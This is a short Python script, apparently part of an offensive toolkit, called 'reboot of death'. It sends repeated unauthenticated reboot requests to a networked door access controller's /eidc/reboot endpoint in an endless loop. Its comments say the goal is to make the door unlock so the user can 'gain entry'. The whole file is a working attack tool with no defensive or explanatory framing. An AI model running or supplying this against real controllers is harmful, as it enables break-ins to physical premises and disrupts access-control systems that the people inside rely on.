# reboot of death
import requests
import time

def reboot_death():
    # Put a door controller in a reboot loop, could cause the door to unlock and gain entry.
    print('Cause a door controller to constantly reboot, you might just get in the door')

    ip = input('Controller IP: ')
    try:
        while True:
            con_reboot = 'http://{0}/eidc/reboot'.format(ip)
            get_reboot = requests.get(con_reboot)
            print(get_reboot.json())
            time.sleep(10)
    except KeyboardInterrupt:
        pass